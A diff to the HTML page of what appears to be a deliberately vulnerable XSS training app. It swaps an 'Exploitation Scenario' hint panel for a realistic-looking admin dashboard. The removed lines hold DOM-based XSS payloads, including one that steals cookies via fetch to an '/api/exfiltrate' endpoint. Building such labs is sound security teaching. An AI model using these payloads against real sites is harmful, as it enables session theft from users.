@@ -22,40 +22,26 @@
                 </div>
             </div>
 
-            <!-- Scenario Explanation -->
+            <!-- Admin Panel -->
             <div class="bg-white/10 backdrop-blur-md rounded-lg shadow-2xl p-8">
-                <h2 class="text-2xl font-bold mb-4">Exploitation Scenario</h2>
-                <p class="text-white/80 mb-4">
-                    You are simulating an <strong>admin user</strong>. An attacker has sent you a malicious
-                    link that exploits a DOM-based XSS vulnerability.
+                <h2 class="text-2xl font-bold mb-4">Admin Dashboard</h2>
+                <p class="text-white/80 mb-6">
+                    Welcome to the administrator control panel.
                 </p>
 
-                <div class="bg-black/30 rounded-lg p-6 mb-6">
-                    <p class="text-sm font-semibold mb-3">Example Malicious Links:</p>
-                    <div class="space-y-3 text-xs font-mono">
-                        <div class="bg-black/40 p-3 rounded">
-                            <p class="text-white/60 mb-1">Basic XSS:</p>
-                            <a href="/#<img src=x onerror=alert(document.cookie)>"
-                               class="text-blue-400 hover:text-blue-300 break-all">
-                                /#&lt;img src=x onerror=alert(document.cookie)&gt;
-                            </a>
-                        </div>
-
-                        <div class="bg-black/40 p-3 rounded">
-                            <p class="text-white/60 mb-1">Session Theft:</p>
-                            <a href="/#<img src=x onerror=fetch('/api/exfiltrate?session='+document.cookie)>"
-                               class="text-blue-400 hover:text-blue-300 break-all">
-                                /#&lt;img src=x onerror=fetch('/api/exfiltrate?session='+document.cookie)&gt;
-                            </a>
-                        </div>
+                <div class="space-y-3">
+                    <div class="flex justify-between items-center p-3 bg-black/20 rounded">
+                        <span class="text-white/70">Status:</span>
+                        <span class="text-green-300 font-medium">Active</span>
                     </div>
-                </div>
-
-                <div class="bg-yellow-500/20 border border-yellow-500/50 rounded-lg p-4">
-                    <p class="text-sm">
-                        💡 <strong>Tip:</strong> The vulnerability is in the client-side JavaScript.
-                        View the page source to analyze how notes are rendered from the URL hash.
-                    </p>
+                    <div class="flex justify-between items-center p-3 bg-black/20 rounded">
+                        <span class="text-white/70">Total Notes:</span>
+                        <span class="font-medium">3</span>
+                    </div>
+                    <div class="flex justify-between items-center p-3 bg-black/20 rounded">
+                        <span class="text-white/70">Last Login:</span>
+                        <span class="font-medium text-sm">Just now</span>
+                    </div>
                 </div>
             </div>
         </div>
